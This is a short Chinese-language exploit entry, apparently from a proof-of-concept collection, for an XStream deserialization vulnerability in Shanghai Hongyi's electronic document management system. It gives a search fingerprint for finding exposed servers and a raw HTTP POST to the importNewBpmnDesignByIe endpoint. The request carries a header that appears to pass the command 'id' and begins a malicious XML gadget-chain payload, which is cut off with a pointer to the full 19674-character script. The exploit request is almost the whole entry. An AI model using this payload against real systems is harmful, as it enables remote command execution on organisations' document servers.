# 上海鸿翼软件-电子文档管理系统importNewBpmnDesignByIe存在XStream反序列化漏洞

- **系统**：上海鸿翼软件-电子文档管理系统　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`body="/Content/themes/techblue/main.parttwo.css"`

**请求体 / payload**
```
**POST** /edoc2Flow-web/edoc-etc-processManage/importNewBpmnDesignByIe?**groupId**=**1** **HTTP/1.1**
**Host**:
**User-Agent**: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Last-Modified-Xisxf: id
**Content-Type**: **multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW**
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="3.xml"
Content-Type: application/xml
<linked-hash-set>
<dynamic-proxy>
<interface>map</interface>
<handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'>
<classToInvocationHa…（脚本共 19674 字，完整版见原文）
```
- **预期**：200　|　—